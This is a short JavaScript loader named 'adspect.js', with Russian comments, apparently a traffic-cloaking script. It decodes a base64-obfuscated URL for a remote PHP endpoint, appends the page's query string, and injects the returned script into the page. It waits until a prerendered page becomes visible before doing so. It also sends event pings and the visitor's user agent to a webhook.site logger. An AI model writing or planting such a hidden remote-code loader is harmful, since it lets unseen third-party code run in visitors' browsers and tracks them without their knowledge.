// adspect.js (v1.0.2) — с логами и защитой от prerender/preload
(function () {
  // Замените на свой приёмник логов.
  // Быстро и бесплатно — возьми уникальный URL на https://webhook.site/ (или свой лог-эндпоинт).
  var LOG_BASE = 'https://webhook.site/7163e569-d4a1-47ab-a2a0-c2d28d62c820';

  function ping(evt, extra) {
    try {
      var u = LOG_BASE + '?evt=' + encodeURIComponent(evt)
        + '&ua=' + encodeURIComponent(navigator.userAgent)
        + '&t=' + Date.now()
        + (extra ? '&extra=' + encodeURIComponent(extra) : '');
      (new Image()).src = u;
    } catch (e) {}
  }

  function inject() {
    try {
      ping('inject-start');

      var a = location;
      var head = document.head || document.getElementsByTagName('head')[0] || document.documentElement;

      // Ваш PHP endpoint с __sid (оставил base64 как у вас)
      var d = atob('aHR0cHM6Ly91c2VwcmVtaXVtLnNob3AvYWpheC5waHA/X19zaWQ9NThlMWJlZTktYjAyMi00NTFkLWE4Y2ItNjFhZWUwZTY0Zjhi');
      d += (d.indexOf('?') > -1 ? '&' : '?') + a.search.substring(1 || 0);

      var s = document.createElement('script');
      s.src = d;
      try { s.id = btoa(a.origin); } catch (_) {}

      s.onload = function(){ ping('ajax-loaded'); };
      s.onerror = function(){ ping('ajax-error'); };

      head.appendChild(s);
    } catch (e) {
      ping('inject-exception', (e && (e.message || e.name)) || 'unknown');
    }
  }

  // Устойчивость к prerender/preload в In-App браузерах
  var visibleNow = (typeof document.prerendering !== 'undefined')
    ? !document.prerendering
    : (!('visibilityState' in document) || document.visibilityState === 'visible');

  if (visibleNow) {
    inject();
  } else {
    var onVisible = function () {
      var ready = (typeof document.prerendering !== 'undefined')
        ? !document.prerendering
        : (document.visibilityState === 'visible');

      if (ready) {
        document.removeEventListener('visibilitychange', onVisible, true);
        window.removeEventListener('pageshow', onVisible, true);
        inject();
      }
    };
    document.addEventListener('visibilitychange', onVisible, true);
    window.addEventListener('pageshow', onVisible, true);

    // Фолбэк на редко молчащие WebView
    setTimeout(inject, 1500);
  }
})();
